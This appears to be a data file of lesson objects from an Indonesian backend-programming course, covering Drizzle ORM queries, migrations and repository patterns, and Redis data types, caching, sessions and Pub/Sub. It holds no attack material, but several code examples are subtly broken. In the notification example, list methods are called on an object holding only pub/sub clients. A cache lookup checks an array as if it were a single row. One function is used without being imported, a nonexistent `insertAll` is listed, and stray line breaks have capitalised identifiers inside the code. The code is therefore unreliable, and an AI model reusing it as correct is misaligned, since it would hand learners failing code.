    moduleId: 17,

    chapterNum: "17.10",

    title: "Drizzle ORM: CRUD Queries dan Relasi",

    subtitle: "Operasi database sehari-hari dengan type safety",

    level: "Menengah",

    objectives: [

      "Bisa melakukan CRUD operations",

      "Mengerti query builder Drizzle",

      "Bisa menangani relasi antar tabel",

    ],

    analogy: { diagram: "Query Types:\nSELECT → db.select().from(table)\nINSERT → db.insert(table).values({...})\nUPDATE → db.update(table).set({...}).where(...)\nDELETE → db.delete(table).where(...)", caption: "Drizzle query syntax mirip SQL — mudah dipelajari kalau sudah tahu SQL" },

    explanation: "Setelah schema didefinisikan, saatnya belajar melakukan operasi CRUD (Create, Read, Update, Delete).\n\nDrizzle menyediakan query builder yang syntax-nya sangat mirip SQL.\\n\\n**SELECT Queries**\\n```typescript\\n// Select all\\nconst allUsers = await db.select().from(users);\\n\\n// Select specific columns\\nconst userNames = await db.select({ name: users.name, email: users.email }).from(users);\\n\\n// With WHERE clause\\nconst user = await db.select().from(users).where(eq(users.id, 1));\\n\\n// Multiple conditions\\nconst admins = await db.select().from(users)\\n  .where(and(eq(users.role,\n\n'admin'), gte(users.id, 1)));\\n\\n// LIKE / ILIKE\\nconst results = await db.select().from(users)\\n  .where(like(users.name, '%Budi%'));\\n\\n// ORDER BY\\nconst sorted = await db.select().from(users)\\n  .orderBy(desc(users.createdAt));\\n\\n// LIMIT and OFFSET\\nconst paginated = await db.select().from(users)\\n  .limit(10).offset(20);\\n```\\n\\nNotice: eq(), and(), gte(), like(), desc() adalah helper functions dari drizzle-orm.\n\nMereka menghasilkan SQL expression yang type-safe.\\n\\n**INSERT Queries**\\n```typescript\\n// Insert single\\nconst newUser = await db.insert(users).values({\\n  name: 'Budi',\\n  email: 'budi@email.com',\\n}).returning(); // Return inserted row\\n\\n// Insert multiple\\nawait db.insert(users).values([\\n  { name: 'Budi', email: 'budi@mail.com' },\\n  { name: 'Ani', email: 'ani@mail.com' },\\n]);\\n```\\n\\n**UPDATE Queries**\\n```typescript\\nawait db.update(users)\\n  .set({ name: 'Budi Santoso' })\\n  .where(eq(users.id, 1))\\n  .returning(); // Return updated row\\n```\\n\\n**DELETE Queries**\\n```typescript\\nawait db.delete(users).where(eq(users.id,\n\n1));\\n```\\n\\n**Relasi (Joins)**\\nDrizzle support SQL joins dengan syntax yang natural:\\n\\n```typescript\\nimport { eq } from 'drizzle-orm';\\n\\nconst result = await db.select()\\n  .from(users)\\n  .innerJoin(products, eq(users.id, products.userId))\\n  .where(eq(users.id, 1));\\n```\\n\\n**Aggregate Functions**\\n```typescript\\nimport { count, avg, sum } from 'drizzle-orm';\\n\\nconst stats = await db.select({\\n  total: count(),\\n  avgPrice: avg(products.price),\\n  totalStock: sum(products.stock),\\n}).from(products);\\n```",

    codeExample: { language: "typescript", code: "// CRUD operations lengkap\nimport { eq, and, like, desc, count } from 'drizzle-orm';\nimport { db } from './db';\nimport { users, products } from './schema';\n\n// CREATE\nasync function createUser(data: { name: string; email: string }) {\n  const [user] = await db.insert(users).values(data).returning();\n  return user;\n}\n\n// READ with filters\nasync function getUsers(options: {\n  search?: string;\n  role?: string;\n  page?: number;\n  limit?: number;\n} = {}) {\n  const { search, role, page = 1, limit = 10 } = options;\n  \n  const conditions = [];\n  if (search) conditions.push(like(users.name, `%${search}%`));\n  if (role) conditions.push(eq(users.role, role));\n  \n  const where = conditions.length > 0 ? and(...conditions) : undefined;\n  \n  const [data, totalResult] = await Promise.all([\n    db.select().from(users).where(where).orderBy(desc(users.createdAt)).limit(limit).offset((page - 1) * limit),\n    db.select({ count: count() }).from(users).where(where),\n  ]);\n  \n  return {\n    data,\n    pagination: {\n      page,\n      limit,\n      total: totalResult[0].count,\n      totalPages: Math.ceil(totalResult[0].count / limit),\n    },\n  };\n}\n\n// UPDATE\nasync function updateUser(id: number, data: Partial<{ name: string; email: string; role: string }>) {\n  const [user] = await db.update(users).set(data).where(eq(users.id, id)).returning();\n  return user;\n}\n\n// DELETE\nasync function deleteUser(id: number) {\n  await db.delete(users).where(eq(users.id, id));\n}\n\n// Get user with their products\nasync function getUserWithProducts(userId: number) {\n  const result = await db.select()\n    .from(users)\n    .leftJoin(products, eq(users.id, products.userId))\n    .where(eq(users.id, userId));\n  \n  return result;\n}" },

    explainAlong: "and() menggabungkan conditions dengan AND. Promise.all untuk parallel queries. Returning() mengembalikan row yang terpengaruh.",

    aiPrompt: "Implementasikan full-text search dengan SQLite FTS5 extension melalui Drizzle. Buat virtual table untuk search.",

    reflection: "Benchmark query Drizzle-mu. Bandingkan dengan raw SQL untuk query yang sama. Apakah overhead-nya signifikan?",

  },

  {

    id: "17.11",

    moduleId: 17,

    chapterNum: "17.11",

    title: "Drizzle ORM: Migrations dan Database Kit",

    subtitle: "Kelola perubahan schema dan database operations dengan Drizzle Kit",

    level: "Menengah",

    objectives: [

      "Bisa membuat dan menjalankan migrations",

      "Mengerti Drizzle Kit commands",

      "Bisa seed database dan manage schema",

    ],

    analogy: { diagram: "Workflow:\n1. Ubah schema (schema.ts)\n2. Generate migration: drizzle-kit generate\n3. Apply migration: drizzle-kit migrate\n4. Rollback jika perlu", caption: "Drizzle Kit mengotomatisasi schema migrations dengan generate SQL files" },

    explanation: "Seiring aplikasi berkembang, schema database pasti berubah: tambah tabel baru, tambah kolom, ubah tipe data, tambah index. Mengelola perubahan ini secara manual berisiko error dan inkonsistensi antar environment. Drizzle Kit adalah CLI tool untuk mengelola schema migrations.\\n\\n**Drizzle Kit Setup**\\nBuat file konfigurasi drizzle.config.ts:\\n\\n```typescript\\nimport { defineConfig } from 'drizzle-kit';\\n\\nexport default defineConfig({\\n  schema: './src/schema.ts',\\n  out: './drizzle',\\n  dialect: 'sqlite',\\n  dbCredentials: {\\n    url: './app.db',\\n  },\\n});\\n```\\n\\n**Generate Migrations**\\nSetelah mengubah schema, generate migration file:\\n\\n```bash\\nnpx drizzle-kit generate\\n```\\n\\nDrizzle Kit akan:\\n1. Membandingkan schema saat ini dengan previous state\\n2.\n\nGenerate SQL migration file di folder drizzle/\\n3.\n\nBeri nama dengan timestamp\\n\\nContoh output:\\n```sql\\n-- drizzle/0001_add_user_role.sql\\nALTER TABLE users ADD COLUMN role text DEFAULT 'user';\\n```\\n\\n**Apply Migrations**\\n```bash\\nnpx drizzle-kit migrate\\n```\\n\\n**Push (Development Only)**\\nUntuk development cepat tanpa manage migration files:\\n\\n```bash\\nnpx drizzle-kit push\\n```\\n\\nPush akan langsung mengubah database schema tanpa membuat migration file.\n\nBerguna saat prototyping.\\n\\n**Studio: GUI Database**\\nDrizzle Kit punya built-in GUI untuk explore database:\\n\\n```bash\\nnpx drizzle-kit studio\\n```\\n\\nBuka browser di localhost — kamu bisa lihat tabel, data, dan bahkan jalankan query!\\n\\n**Seeding Database**\\nUntuk populate database dengan data awal:\\n\\n```typescript\\n// seed.ts\\nimport { db } from './db';\\nimport { users,\n\nProducts } from './schema';\\n\\nasync function seed() {\\n  await db.insert(users).values([\\n    { name: 'Admin', email: 'admin@mail.com', role: 'admin' },\\n    { name: 'User', email: 'user@mail.com', role: 'user' },\\n  ]);\\n  \\n  await db.insert(products).values([\\n    { name: 'Laptop', price: 12000000, stock: 10 },\\n    { name: 'Mouse', price: 250000, stock: 50 },\\n  ]);\\n}\\n\\nseed();\\n```\\n\\n**Rollback Migrations**\\nDrizzle belum punya built-in rollback command.\n\nUntuk rollback, kamu bisa:\\n1.\n\nTulis migration down manual\\n2. Gunakan snapshot system Drizzle\\n3. Restore dari backup",

    codeExample: { language: "typescript", code: "// drizzle.config.ts\nimport { defineConfig } from 'drizzle-kit';\n\nexport default defineConfig({\n  schema: './src/db/schema.ts',\n  out: './drizzle/migrations',\n  dialect: 'sqlite',\n  dbCredentials: {\n    url: './app.db',\n  },\n  introspect: {\n    casing: 'camel',\n  },\n});\n\n// db.ts - connection setup\nimport { Database } from 'bun:sqlite';\nimport { drizzle } from 'drizzle-orm/bun-sqlite';\nimport * as schema from './schema';\n\nconst sqlite = new Database('app.db');\nexport const db = drizzle(sqlite, { schema });\n\n// Seed script\nimport { db } from './db';\nimport { users } from './schema';\n\nasync function seed() {\n  console.log('Seeding database...');\n  \n  await db.delete(users); // Clear existing\n  \n  await db.insert(users).values([\n    { name: 'Budi Santoso', email: 'budi@mail.com', role: 'admin' },\n    { name: 'Ani Wijaya', email: 'ani@mail.com', role: 'user' },\n    { name: 'Citra Dewi', email: 'citra@mail.com', role: 'user' },\n  ]);\n  \n  console.log('Seeded 3 users');\n}\n\nseed().catch(console.error);\n\n// package.json scripts\n// \"db:generate\": \"drizzle-kit generate\"\n// \"db:migrate\": \"drizzle-kit migrate\"\n// \"db:studio\": \"drizzle-kit studio\"\n// \"db:seed\": \"bun run src/db/seed.ts\"\n// \"db:push\": \"drizzle-kit push\"" },

    explainAlong: "drizzle() menerima instance database dan schema untuk type-safe queries. { schema } opsional tapi direkomendasikan untuk relational queries.",

    aiPrompt: "Setup Drizzle Studio dan eksplor database-mu melalui GUI. Tambahkan seed script untuk development data.",

    reflection: "Buat workflow CI/CD untuk automated database migrations saat deployment.",

  },

  {

    id: "17.12",

    moduleId: 17,

    chapterNum: "17.12",

    title: "Drizzle ORM: Advanced Queries dan Best Practices",

    subtitle: "Query kompleks, performance, dan pattern production-ready",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa menulis query kompleks dengan Drizzle",

      "Mengerti transaction dan batch queries",

      "Mengerti pattern repository dan service layer",

    ],

    analogy: { diagram: "Advanced Patterns:\n├── Transactions (db.transaction)\n├── Batch inserts (db.insertAll)\n├── Subqueries\n├── CTE (Common Table Expressions)\n└── Repository Pattern", caption: "Production code membutuhkan pattern yang terstruktur dan query yang efisien" },

    explanation: "Setelah menguasai CRUD dasar dan migrations, saatnya mengeksplor teknik advanced yang dibutuhkan aplikasi production.\\n\\n**Transactions**\\nTransaction memastikan beberapa operasi database berhasil SEMUA atau GAGAL SEMUA — tidak ada setengah-setengah.\n\nIni penting untuk operasi finansial, inventory, atau data yang saling bergantung.\\n\\n```typescript\\nawait db.transaction(async (tx) => {\\n  // Kurangi stok\\n  await tx.update(products)\\n    .set({ stock: sql`${products.stock} - 1` })\\n    .where(eq(products.id, productId));\\n  \\n  // Buat order\\n  const order = await tx.insert(orders).values({ productId, userId }).returning();\\n  \\n  // Kalau salah satu gagal, semua di-rollback\\n});\\n```\\n\\n**Raw SQL Fallback**\\nUntuk query yang terlalu kompleks untuk query builder, gunakan raw SQL:\\n\\n```typescript\\nimport { sql } from 'drizzle-orm';\\n\\nconst result = await db.run(sql`\\n  WITH RECURSIVE category_tree AS (\\n    SELECT id, name, parent_id, 0 as depth\\n    FROM categories WHERE parent_id IS NULL\\n    UNION ALL\\n    SELECT c.id, c.name, c.parent_id, ct.depth + 1\\n    FROM categories c\\n    JOIN category_tree ct ON c.parent_id = ct.id\\n  )\\n  SELECT * FROM category_tree\\n`);\\n```\\n\\nNotice: sql tagged template literal — tetap type-safe untuk parameters!\\n\\n**Batch Operations**\\nUntuk insert/update banyak data sekaligus:\\n\\n```typescript\\n// Batch insert (lebih efisien daripada insert satu-satu)\\nawait db.insert(users).values([\\n  { name: 'User 1',\n\nEmail: 'u1@mail.com' },\\n  { name: 'User 2', email: 'u2@mail.com' },\\n  // ... 1000 users\\n]);\\n```\\n\\n**Repository Pattern**\\nUntuk aplikasi besar, gunakan repository pattern untuk memisahkan data access logic:\\n\\n```typescript\\n// repositories/UserRepository.ts\\nexport class UserRepository {\\n  async findById(id: number) {\\n    const [user] = await db.select().from(users).where(eq(users.id, id));\\n    return user ?? null;\\n  }\\n  \\n  async findByEmail(email: string) {\\n    const [user] = await db.select().from(users).where(eq(users.email, email));\\n    return user ?? null;\\n  }\\n  \\n  async create(data: NewUser) {\\n    const [user] = await db.insert(users).values(data).returning();\\n    return user;\\n  }\\n}\\n```\\n\\n**Prepared Statements**\\nDrizzle secara otomatis menggunakan prepared statements untuk keamanan (mencegah SQL injection) dan performa (query plan di-cache oleh database).\\n\\n**Indexing**\\nTambahkan index di schema untuk query yang sering dijalankan:\\n\\n```typescript\\nexport const users = sqliteTable('users', {\\n  id: integer('id').primaryKey(),\\n  email: text('email').notNull().unique(),\\n}, (table) => [\\n  index('email_idx').on(table.email),\\n]);\\n```",

    codeExample: { language: "typescript", code: "// Repository pattern implementation\nimport { eq, like, and, desc } from 'drizzle-orm';\nimport { db } from './db';\nimport { users, type User, type NewUser } from './schema';\n\nexport class UserRepository {\n  async findAll(options: { search?: string; role?: string; limit?: number; offset?: number } = {}) {\n    const { search, role, limit = 50, offset = 0 } = options;\n    const conditions = [];\n    \n    if (search) conditions.push(like(users.name, `%${search}%`));\n    if (role) conditions.push(eq(users.role, role));\n    \n    return db.select().from(users)\n      .where(conditions.length ? and(...conditions) : undefined)\n      .orderBy(desc(users.createdAt))\n      .limit(limit)\n      .offset(offset);\n  }\n\n  async findById(id: number): Promise<User | null> {\n    const [user] = await db.select().from(users).where(eq(users.id, id));\n    return user ?? null;\n  }\n\n  async findByEmail(email: string): Promise<User | null> {\n    const [user] = await db.select().from(users).where(eq(users.email, email));\n    return user ?? null;\n  }\n\n  async create(data: NewUser): Promise<User> {\n    const [user] = await db.insert(users).values(data).returning();\n    return user;\n  }\n\n  async update(id: number, data: Partial<NewUser>): Promise<User | null> {\n    const [user] = await db.update(users).set(data).where(eq(users.id, id)).returning();\n    return user ?? null;\n  }\n\n  async delete(id: number): Promise<void> {\n    await db.delete(users).where(eq(users.id, id));\n  }\n\n  async exists(email: string): Promise<boolean> {\n    const result = await db.select({ count: count() }).from(users).where(eq(users.email, email));\n    return result[0].count > 0;\n  }\n}\n\n// Usage in service layer\nconst userRepo = new UserRepository();\nconst user = await userRepo.findById(1);\nif (!user) throw new HTTPException(404, { message: 'User not found' });" },

    explainAlong: "Repository pattern memisahkan data access dari business logic. Memudahkan testing dan refactoring. Null coalescing (??) untuk default value.",

    aiPrompt: "Implementasikan Unit of Work pattern dengan Drizzle transactions. Semua operasi dalam satu request menggunakan transaction yang sama.",

    reflection: "Tambahkan query logging untuk development. Catat setiap query yang dijalankan beserta execution time-nya.",

  },

  {

    id: "17.13",

    moduleId: 17,

    chapterNum: "17.13",

    title: "Redis: Database In-Memory untuk Performa",

    subtitle: "Struktur data, caching, dan real-time dengan Redis",

    level: "Menengah",

    objectives: [

      "Memahami konsep Redis dan use cases",

      "Bisa install dan setup Redis",

      "Menguasai data types dasar Redis",

    ],

    analogy: { diagram: "Redis Data Types:\n├── String (key-value)\n├── Hash (object)\n├── List (queue/stack)\n├── Set (unique collection)\n├── Sorted Set (ranking)\n└── Stream (event log)", caption: "Redis adalah database in-memory super cepat untuk caching, session, dan real-time data" },

    explanation: "Redis (REmote DIctionary Server) adalah database in-memory yang menyimpan data di RAM alih-alih disk. Hasilnya? Operasi read/write dalam sub-milidetik — 10-100x lebih cepat daripada database disk-based.\\n\\n**Kenapa Redis?**\\n1. **Speed**: Sub-milidetik latency untuk semua operasi\\n2.\n\n**Simplicity**: Data model sederhana, mudah dipahami\\n3.\n\n**Versatility**: Banyak data types untuk use case berbeda\\n4.\n\n**Persistence**: Opsi persistensi (RDB snapshot, AOF log)\\n5.\n\n**Pub/Sub**: Messaging real-time built-in\\n\\n**Use Cases Redis**\\n- **Caching**: Simpan query result, API response, HTML fragments\\n- **Session store**: Simpan user session (lebih cepat daripada database)\\n- **Rate limiting**: Track request count per IP/user\\n- **Leaderboard**: Sorted set untuk ranking\\n- **Queue**: List untuk job queue\\n- **Real-time**: Pub/sub untuk chat,\n\nNotifications\\n- **Counting**: Counter dengan increment/decrement\\n\\n**Install Redis**\\n```bash\\n# Docker (recommended untuk development)\\ndocker run -d --name redis -p 6379:6379 redis:7-alpine\\n\\n# atau install langsung\\n# Ubuntu: sudo apt install redis-server\\n# macOS: brew install redis\\n```\\n\\n**Data Types Dasar**\\n\\n**String**: Key-value paling sederhana\\n```\\nSET user:1:name \\\"Budi\\\"\\nGET user:1:name\\nSET counter 100\\nINCR counter      # 101\\nINCRBY counter 5  # 106\\nEXPIRE session:abc 3600  # TTL 1 jam\\n```\\n\\n**Hash**: Struktur seperti object JavaScript\\n```\\nHSET user:1 name \\\"Budi\\\" email \\\"budi@mail.com\\\" age 25\\nHGET user:1 name\\nHGETALL user:1\\n```\\n\\n**List**: Ordered collection (bisa jadi queue atau stack)\\n```\\nLPUSH queue:jobs \\\"job1\\\" \\\"job2\\\"  # Push ke kiri\\nRPOP queue:jobs                  # Pop dari kanan (FIFO queue)\\nLRANGE queue:jobs 0 -1           # Lihat semua\\n```\\n\\n**Set**: Unordered unique collection\\n```\\nSADD tags:post:1 \\\"javascript\\\" \\\"backend\\\" \\\"redis\\\"\\nSMEMBERS tags:post:1\\nSISMEMBER tags:post:1 \\\"redis\\\"  # 1 (true)\\n```\\n\\n**Sorted Set**: Set dengan score untuk sorting\\n```\\nZADD leaderboard 100 \\\"Budi\\\" 150 \\\"Ani\\\" 80 \\\"Citra\\\"\\nZRANGE leaderboard 0 -1 WITHSCORES  # Urutan ascending\\nZREVRANGE leaderboard 0 2           # Top 3\\n```",

    codeExample: { language: "bash", code: "# Redis CLI commands\n# String\nSET app:version \"1.0.0\"\nGET app:version\nSET temp:value \"42\" EX 60  # Expire dalam 60 detik\n\n# Hash\nHSET user:100 name \"Budi\" email \"budi@mail.com\" role \"admin\"\nHGET user:100 name\nHGETALL user:100\nHDEL user:100 role\n\n# List (Queue)\nLPUSH notifications:user:100 \"Pesan baru\" \"Update sistem\"\nLLEN notifications:user:100\nLRANGE notifications:user:100 0 9\nLPOP notifications:user:100\n\n# Set\nSADD online:users \"user:100\" \"user:101\" \"user:102\"\nSCARD online:users\nSISMEMBER online:users \"user:100\"\nSREM online:users \"user:101\"\n\n# Sorted Set (Leaderboard)\nZADD game:leaderboard 5000 \"Budi\" 7200 \"Ani\" 3100 \"Citra\"\nZREVRANGE game:leaderboard 0 2 WITHSCORES\nZINCRBY game:leaderboard 100 \"Budi\"\nZRANK game:leaderboard \"Budi\"  # Posisi (0-indexed)" },

    explainAlong: "EX = expire (TTL dalam detik). HGETALL mengembalikan semua field-value. ZREVRANGE untuk ranking tertinggi pertama.",

    aiPrompt: "Install Redis dengan Docker. Coba semua data types di atas menggunakan redis-cli. Ukur response time dengan Redis.",

    reflection: "Pikirkan 3 use case di aplikasimu yang bisa dioptimasi dengan Redis caching.",

  },

  {

    id: "17.14",

    moduleId: 17,

    chapterNum: "17.14",

    title: "Redis: Caching Strategy dan Session Management",

    subtitle: "Implementasi caching dan session store di aplikasi backend",

    level: "Menengah",

    objectives: [

      "Bisa implementasi cache-aside dan write-through",

      "Mengerti cache invalidation strategies",

      "Bisa membuat session store dengan Redis",

    ],

    analogy: { diagram: "Caching Strategies:\n├── Cache-Aside (Lazy Load)\n├── Write-Through (Sync)\n├── Write-Behind (Async)\n└── Cache Invalidation\n\nSession Store:\nSET session:abc123 '{\"userId\":1}' EX 3600", caption: "Caching adalah use case paling umum Redis — strategi yang tepat sangat penting" },

    explanation: "Caching adalah tentang trade-off: kamu menukar freshness data dengan kecepatan. Strategi caching yang tepat tergantung pada seberapa sering data berubah dan seberapa penting data yang selalu fresh.\\n\\n**Cache-Aside (Lazy Loading)**\\nPola paling umum: cek cache dulu, kalau miss baru ke database.\\n\\n```\\n1. App minta data\\n2. Cek Redis → HIT? return data\\n3.\n\nMISS? Query database\\n4. Simpan ke Redis\\n5. Return data\\n```\\n\\nPros: Simple, tidak ada write penalty\\nCons: Cache miss tetap lambat (db query), risk stale data\\n\\n**Write-Through**\\nSetiap write ke database juga write ke cache secara synchronous.\\n\\n```\\n1.\n\nApp write data\\n2. Simpan ke database\\n3. Simpan ke cache\\n4. Return success\\n```\\n\\nPros: Cache selalu fresh, read cepat\\nCons: Write lebih lambat (2x write), cache bisa membesar tanpa batas\\n\\n**Write-Behind (Write-Back)**\\nWrite ke cache dulu, database di-update secara async.\\n\\n```\\n1.\n\nApp write data\\n2. Simpan ke cache\\n3. Return success (kepada user)\\n4. Async: update database\\n```\\n\\nPros: Write sangat cepat, throughput tinggi\\nCons: Risk data loss kalau crash sebelum db write\\n\\n**Cache Invalidation**\\nInvalidasi cache lebih penting daripada caching itu sendiri.\n\nStrategi:\\n\\n1. **TTL (Time To Live)**: Set expire otomatis\\n   ```\\n   SET cache:user:1 $data EX 300  # Expire 5 menit\\n   ```\\n\\n2. **Active Invalidation**: Hapus cache saat data berubah\\n   ```\\n   // Saat user di-update\\n   UPDATE users SET name = 'Baru' WHERE id = 1;\\n   DEL cache:user:1;  // Invalidate cache\\n   ```\\n\\n3. **Pattern-based Invalidation**: Hapus multiple keys\\n   ```\\n   KEYS cache:user:*  # Find all user cache\\n   DEL cache:user:1 cache:user:2 ...\\n   ```\\n\\n**Session Store**\\nRedis sangat cocok untuk session store karena:\\n- Cepat (sub-milidetik read/write)\\n- Auto-expire (session timeout otomatis)\\n- Shared across servers (semua server akses Redis yang sama)\\n\\n```typescript\\n// Session flow\\n// 1.\n\nUser login → buat session\\nconst sessionId = crypto.randomUUID();\\nawait redis.setex(`session:${sessionId}`, 3600, JSON.stringify({ userId: 1, role: 'admin' }));\\n// Set cookie dengan sessionId\\n\\n// 2. Request berikutnya → validasi session\\nconst session = await redis.get(`session:${sessionId}`);\\nif (!session) return 401; // Session expired\\nconst user = JSON.parse(session);\\n```",

    codeExample: { language: "typescript", code: "import { createClient } from 'redis';\n\nconst redis = createClient({ url: 'redis://localhost:6379' });\nawait redis.connect();\n\n// Cache-aside implementation\nclass UserCache {\n  private ttl = 300; // 5 menit\n  \n  async getUser(id: number) {\n    // 1. Cek cache\n    const cached = await redis.get(`user:${id}`);\n    if (cached) {\n      console.log('Cache HIT');\n      return JSON.parse(cached);\n    }\n    \n    // 2. Cache miss → query DB\n    console.log('Cache MISS');\n    const user = await db.select().from(users).where(eq(users.id, id));\n    if (!user) return null;\n    \n    // 3. Simpan ke cache\n    await redis.setex(`user:${id}`, this.ttl, JSON.stringify(user));\n    return user;\n  }\n  \n  async invalidateUser(id: number) {\n    await redis.del(`user:${id}`);\n  }\n  \n  async updateUser(id: number, data: any) {\n    // Write-through: update DB + cache\n    const [user] = await db.update(users).set(data).where(eq(users.id, id)).returning();\n    await redis.setex(`user:${id}`, this.ttl, JSON.stringify(user));\n    return user;\n  }\n}\n\n// Session store\nclass SessionStore {\n  private ttl = 3600; // 1 jam\n  \n  async create(userId: number, data: any): Promise<string> {\n    const sessionId = crypto.randomUUID();\n    await redis.setex(`session:${sessionId}`, this.ttl, JSON.stringify({ userId, ...data }));\n    return sessionId;\n  }\n  \n  async get(sessionId: string): Promise<any | null> {\n    const data = await redis.get(`session:${sessionId}`);\n    return data ? JSON.parse(data) : null;\n  }\n  \n  async destroy(sessionId: string): Promise<void> {\n    await redis.del(`session:${sessionId}`);\n  }\n  \n  async refresh(sessionId: string): Promise<void> {\n    await redis.expire(`session:${sessionId}`, this.ttl);\n  }\n}" },

    explainAlong: "setex = set + expire (atomic operation). Pattern cache-aside: get → miss → db → set. Session refresh memperpanjang TTL.",

    aiPrompt: "Implementasikan rate limiting dengan Redis: track request count per IP dengan window 1 menit, limit 60 requests.",

    reflection: "Cache invalidation adalah 'hard problem' dalam computer science. Dokumentasikan strategi caching-mu dan kapan invalidasi terjadi.",

  },

  {

    id: "17.15",

    moduleId: 17,

    chapterNum: "17.15",

    title: "Redis: Pub/Sub dan Real-time Features",

    subtitle: "Messaging real-time, streams, dan use cases advanced",

    level: "Menengah-Lanjut",

    objectives: [

      "Bisa menggunakan Redis Pub/Sub",

      "Mengerti Redis Streams",

      "Bisa implementasi real-time features",

    ],

    analogy: { diagram: "Pub/Sub Flow:\nPublisher → Redis Channel → [Subscriber 1, Subscriber 2, ...]\n\nStreams Flow:\nProducer → Redis Stream → Consumer Group → [Consumer 1, Consumer 2]", caption: "Pub/Sub untuk broadcast, Streams untuk persistent event log" },

    explanation: "Selain caching, Redis punya fitur real-time yang powerful: Pub/Sub dan Streams.\n\nKedua fitur ini memungkinkan komunikasi real-time antar bagian aplikasi.\\n\\n**Pub/Sub: Publish dan Subscribe**\\nPub/Sub adalah pattern messaging di mana publisher mengirim pesan ke channel, dan subscriber yang subscribe ke channel tersebut menerima pesan.\\n\\n```\\nPublisher: PUBLISH notifications:user:100 \\\"Pesan baru!\\\"\\n\\nSubscriber (sebelumnya): SUBSCRIBE notifications:user:100\\n→ Menerima: \\\"Pesan baru!\\\"\\n```\\n\\nKarakteristik Pub/Sub Redis:\\n- Fire and forget: Pesan tidak disimpan,\n\nKalau tidak ada subscriber pesan hilang\\n- One-to-many: Satu pesan bisa diterima banyak subscriber\\n- No persistence: Pesan hanya ada di memory\\n- Decoupled: Publisher tidak tahu siapa subscriber\\n\\nUse cases:\\n- Chat application (broadcast message ke room)\\n- Real-time notifications\\n- Live updates (score, status)\\n- Cache invalidation broadcast\\n\\n**Redis Streams: Persistent Event Log**\\nStreams adalah data structure yang lebih advanced daripada Pub/Sub.\n\nMirip seperti Apache Kafka tapi lebih sederhana:\\n\\n- **Persistent**: Pesan disimpan (tidak hilang seperti Pub/Sub)\\n- **Ordered**: Pesan punya ID dan urutan\\n- **Consumer groups**: Multiple consumers bisa membagi workload\\n- **Acknowledgment**: Pesan harus di-ack setelah diproses\\n\\n```\\n# Producer\\nXADD orders_stream * order_id 100 status pending\\n\\n# Consumer (single)\\nXREAD BLOCK 5000 STREAMS orders_stream $  # Block 5 detik\\n\\n# Consumer Group\\nXGROUP CREATE orders_stream processing_group $ MKSTREAM\\nXREADGROUP GROUP processing_group consumer_1 STREAMS orders_stream >\\nXACK orders_stream processing_group 1698765432100-0\\n```\\n\\n**Pub/Sub di Aplikasi**\\n```typescript\\nimport { createClient } from 'redis';\\n\\nconst pub = createClient({ url: 'redis://localhost:6379' });\\nconst sub = createClient({ url: 'redis://localhost:6379' });\\nawait pub.connect();\\nawait sub.connect();\\n\\n// Subscribe\\nawait sub.subscribe('notifications',\n\n(message) => {\\n  const data = JSON.parse(message);\\n  console.log('Notifikasi:', data);\\n  // Kirim ke WebSocket client\\n});\\n\\n// Publish\\nawait pub.publish('notifications', JSON.stringify({\\n  type: 'new_message',\\n  userId: 100,\\n  content: 'Halo!'\\n}));\\n```\\n\\n**Membangun Chat dengan Redis Pub/Sub + WebSocket**\\nKombinasi Redis Pub/Sub dengan WebSocket memungkinkan chat multi-server.\n\nSetiap server subscribe ke channel, dan broadcast ke semua WebSocket client yang terhubung.",

    codeExample: { language: "typescript", code: "// Real-time notification system\nimport { createClient } from 'redis';\n\nconst redis = {\n  pub: createClient({ url: 'redis://localhost:6379' }),\n  sub: createClient({ url: 'redis://localhost:6379' }),\n};\n\nawait redis.pub.connect();\nawait redis.sub.connect();\n\n// Notification service\nclass NotificationService {\n  async send(userId: number, notification: { type: string; message: string }) {\n    const channel = `notifications:user:${userId}`;\n    const payload = JSON.stringify({\n      ...notification,\n      timestamp: new Date().toISOString(),\n    });\n    \n    // Publish ke channel\n    await redis.pub.publish(channel, payload);\n    \n    // Simpan ke inbox (untuk user yang offline)\n    await redis.lpush(`inbox:user:${userId}`, payload);\n    await redis.ltrim(`inbox:user:${userId}`, 0, 99); // Keep last 100\n  }\n  \n  async subscribe(userId: number, onMessage: (msg: any) => void) {\n    const channel = `notifications:user:${userId}`;\n    await redis.sub.subscribe(channel, (message) => {\n      onMessage(JSON.parse(message));\n    });\n    \n    // Kirim unread messages dari inbox\n    const inbox = await redis.lrange(`inbox:user:${userId}`, 0, -1);\n    inbox.reverse().forEach(msg => onMessage(JSON.parse(msg)));\n    await redis.del(`inbox:user:${userId}`); // Clear inbox setelah deliver\n  }\n  \n  async unsubscribe(userId: number) {\n    await redis.sub.unsubscribe(`notifications:user:${userId}`);\n  }\n}\n\n// Usage with WebSocket\nconst notifService = new NotificationService();\n\n// Saat user connect via WebSocket\nws.on('open', () => {\n  notifService.subscribe(userId, (notification) => {\n    ws.send(JSON.stringify(notification));\n  });\n});" },

    explainAlong: " Kombinasi Pub/Sub (real-time) + List inbox (offline persistence) memastikan user tidak ketinggalan notifikasi.",

    aiPrompt: "Bangun sistem chat sederhana dengan Redis Pub/Sub. Gunakan channel per room. Support join/leave room.",

    reflection: "Bandingkan Redis Streams dengan message queue seperti RabbitMQ atau Apache Kafka. Kapan pakai masing-masing?",

  },

  {

    id: "17.16",

    moduleId: 17,

    chapterNum: "17.16",

    title: "Redis: Optimasi dan Production",

    subtitle: "Konfigurasi production, monitoring, dan pattern advanced",

    level: "Menengah-Lanjut",

    objectives: [

      "Mengerti Redis persistence options",

      "Bisa konfigurasi Redis untuk production",

      "Mengerti Redis Cluster dan Sentinel",

    ],

    analogy: { diagram: "Production Checklist:\n├── Persistence (RDB + AOF)\n├── Memory management (maxmemory policy)\n├── Security (AUTH, ACL)\n├── Monitoring (INFO, Slow Log)\n└── High Availability (Sentinel, Cluster)", caption: "Redis production membutuhkan konfigurasi yang tepat untuk reliability dan performance" },

